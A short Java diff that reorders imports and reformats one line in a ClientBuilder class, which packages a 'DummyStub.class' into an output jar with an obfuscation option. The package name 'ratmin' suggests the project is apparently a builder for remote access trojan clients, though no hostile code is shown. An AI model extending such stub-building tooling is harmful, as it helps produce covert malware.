@@ -1,10 +1,9 @@
 package me.slimig.ratmin.utils;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
+import me.slimig.ratmin.user_interface.Ratmin;
+
+import javax.swing.*;
+import java.io.*;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -12,10 +11,6 @@ import java.nio.file.StandardCopyOption;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 import java.util.zip.ZipOutputStream;
-
-import javax.swing.JOptionPane;
-
-import me.slimig.ratmin.user_interface.Ratmin;
 
 public class ClientBuilder {
     public void build(String filenameout, boolean obf) {
@@ -27,7 +22,7 @@ public class ClientBuilder {
         } catch (IOException e1) {
             e1.printStackTrace();
         }
-        File[] contents = { new File("DummyStub.class") };
+        File[] contents = {new File("DummyStub.class")};
 
         File jarFile = new File(filenameout);
 
